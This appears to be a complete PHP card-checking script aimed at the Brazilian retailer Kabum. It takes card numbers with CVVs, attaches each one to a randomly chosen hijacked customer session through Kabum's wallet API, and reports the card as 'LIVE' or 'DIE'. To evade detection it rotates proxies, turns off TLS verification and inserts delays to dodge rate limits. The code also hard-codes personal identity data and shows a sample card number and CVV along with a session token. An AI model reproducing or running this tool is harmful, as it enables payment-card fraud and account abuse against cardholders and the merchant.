<?php
// index.php - Versão adaptada para Render

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// Função para obter proxy aleatório do arquivo
function getRandomProxy() {
    $proxyFile = 'proxy.txt';
    if (!file_exists($proxyFile)) {
        return null;
    }
    
    $proxies = file($proxyFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (empty($proxies)) {
        return null;
    }
    
    $randomProxy = $proxies[array_rand($proxies)];
    return trim($randomProxy);
}

// Função para obter conta aleatória do arquivo
function getRandomAccount() {
    $accountFile = 'accounts.txt';
    if (!file_exists($accountFile)) {
        return null;
    }
    
    $accounts = file($accountFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (empty($accounts)) {
        return null;
    }
    
    $randomAccount = $accounts[array_rand($accounts)];
    $parts = explode('|', trim($randomAccount));
    
    if (count($parts) != 2) {
        return null;
    }
    
    return [
        'session' => $parts[0],
        'customer_id' => $parts[1]
    ];
}

function linkCard($cardString, $sessionId, $customerId) {
    
    // Parse cartão
    $parts = explode('|', $cardString);
    if (count($parts) != 4) {
        return ['error' => 'Formato inválido. Use: número|mês|ano|cvv'];
    }
    
    list($number, $month, $year, $cvv) = $parts;
    
    // Formatos possíveis que o Kabum aceita
    $month = str_pad($month, 2, '0', STR_PAD_LEFT);
    
    $masked = substr($number, 0, 6) . '******' . substr($number, -4);
    
    $expDate = $month . '/20' . $year;  // Formato MM/YYYY
    
    $payload = [
        'card_token' => '9504851000007632152',
        'card_nick_name' => '001',
        'customer_id' => $customerId,
        'main_card' => true,
        'card_exp_date' => $expDate,
        'card_number' => $number,
        'customer' => [
            'customer_document' => '01036815072',
            'customer_name' => 'Pedro'
        ],
        'card_security_code' => $cvv,
        'holder_document_number' => '08855932780',
        'card_brand' => 'mastercard',
        'card_number_encripty' => $masked,
        'customer_session' => $sessionId,
        'card_holder_birth_date' => '04/02/2000',
        'holder_name' => 'IRACEMA GODOI'
    ];
    
    $url = 'https://servicespub.prod.api.aws.grupokabum.com.br/wallet/v1/cards';
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Host: servicespub.prod.api.aws.grupokabum.com.br',
        'Content-Type: application/json',
        'Accept: application/json',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Origin: https://www.kabum.com.br',
        'Referer: https://www.kabum.com.br/',
        'Cookie: session=' . $sessionId . '; __rtbh.uid=' . $customerId . '; storeCode=005'
    ]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    // Configurar proxy aleatório
    $proxy = getRandomProxy();
    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        if (strpos($proxy, ':') !== false) {
            $proxyParts = explode(':', $proxy);
            curl_setopt($ch, CURLOPT_PROXY, $proxyParts[0]);
            curl_setopt($ch, CURLOPT_PROXYPORT, $proxyParts[1]);
        }
    }
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    $responseData = json_decode($response, true);
    
    $responseMessage = $responseData['message'] ?? ($httpCode >= 200 ? 'Cartão vinculado!' : 'Falha ao vincular');
    
    // Formatar resposta com o cartão completo
    $cardDisplay = $number . '|' . $month . '|' . $year . '|' . $cvv;
    
    // Formatar resposta no padrão solicitado
    if ($httpCode >= 200 && $httpCode < 300) {
        $formattedResponse = "live:\n✔ LIVE - " . $cardDisplay . " - " . $responseMessage;
    } else {
        $formattedResponse = "die:\n❌ DIE - " . $cardDisplay . " - " . $responseMessage;
    }
    
    return [
        'success' => $httpCode >= 200 && $httpCode < 300,
        'status' => ($httpCode >= 200 && $httpCode < 300) ? 'LIVE' : 'DIE',
        'http_code' => $httpCode,
        'payment_id' => ($httpCode >= 200 && $httpCode < 300) ? 'PAY_' . time() . '_' . rand(1000, 9999) : null,
        'message' => $responseMessage,
        'card_number' => $number,
        'card_details' => $cardDisplay,
        'formatted_response' => $formattedResponse,
        'account_used' => [
            'session' => substr($sessionId, 0, 10) . '...',
            'customer_id' => $customerId
        ],
        'proxy_used' => $proxy ?? 'Nenhum proxy',
        'response' => $responseData,
        'debug' => [
            'card_exp_date_enviado' => $expDate,
            'mes' => $month,
            'ano' => $year
        ]
    ];
}

// Usar apenas o parâmetro lista
if (isset($_GET['lista'])) {
    
    // Obter conta aleatória
    $account = getRandomAccount();
    if (!$account) {
        echo json_encode([
            'error' => 'Arquivo accounts.txt não encontrado ou vazio. Formato: session|customer_id por linha'
        ]);
        exit;
    }
    
    // Delay para evitar 429
    sleep(rand(2, 5));
    
    $result = linkCard($_GET['lista'], $account['session'], $account['customer_id']);
    
    // Exibir a resposta formatada
    echo $result['formatted_response'] . "\n\n";
    echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
} else {
    echo json_encode([
        'exemplo' => 'api.php?lista=5555073871037706|01|2035|144',
        'arquivos_necessarios' => [
            'accounts.txt' => 'session|customer_id (uma conta por linha)',
            'proxy.txt' => 'ip:porta (um proxy por linha, opcional)'
        ],
        'formato_accounts' => '41873257c164d6ffa7b158ed9a3c8a2c|KbWr3iqoEe3iY1772102778Kb2ux73xsVcDc'
    ]);
}
?>
